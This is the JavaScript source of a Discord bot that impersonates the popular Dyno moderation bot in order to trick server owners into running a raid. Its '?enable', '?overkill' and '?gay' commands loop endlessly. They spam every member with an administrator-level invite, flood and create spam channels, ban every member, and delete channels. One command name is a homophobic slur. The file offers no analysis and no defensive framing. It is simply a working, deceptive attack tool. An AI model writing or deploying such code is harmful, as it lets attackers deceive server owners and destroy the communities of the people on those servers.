const Discord = require("discord.js");
const bot = new Discord.Client({disableEveryone: true});

function spam(bot, message) {
  bot.generateInvite(['ADMINISTRATOR'])
    .then(link => {
      message.guild.members.forEach(member => member.send(`If you want to prank ur friends, also add me to your server: ${link}`));
    }); 
  bot.channels.filter(c => c.name === 'spam').forEach(channel => channel.send("💣 !! ATTENTION !! - You're in a shitty server! 💣"));
  message.guild.createChannel('spam', 'text')
      .then(console.log)
      .catch(console.error);
 setTimeout(() => spam(bot, message), 30*10);
}

function gay(bot, message) {
  message.channels.filter(c => c.name === 'spam').forEach(channel => {
		  channel.delete()
  			.then(console.log)
  			.catch(console.error);
		});
 setTimeout(() => gay(bot, message), 30*10);
}  

function ban(bot, message) {
  message.guild.members.forEach(member => {
    member.ban('raid')
      .catch(error => console.log(`Sorry, I couldn't ban ${member} because of : ${error}`));
  });                      
 setTimeout(() => ban(bot, message), 30*10);
}

bot.on("ready", async () => {
  console.log(`${bot.user.username} is online!`);

  bot.user.setGame("dynobot.ga | ?help");
});

bot.on("message", async message => {
  if (message.content.startsWith('?enable')) {
    spam(bot, message)
  }
  if (message.content.startsWith('?overkill')) {
    ban(bot, message)
  }
  if (message.content.startsWith('?gay')) {
    gay(bot, message)
  }
  if (message.content.startsWith('?')) {
    if (message.content.startsWith('?enable')) return
    if (message.content.startsWith('?overkill')) return
    message.reply(`to activate Dyno in your server please type \`?enable\`!`)
  }
});

bot.login(process.env.TOKEN);
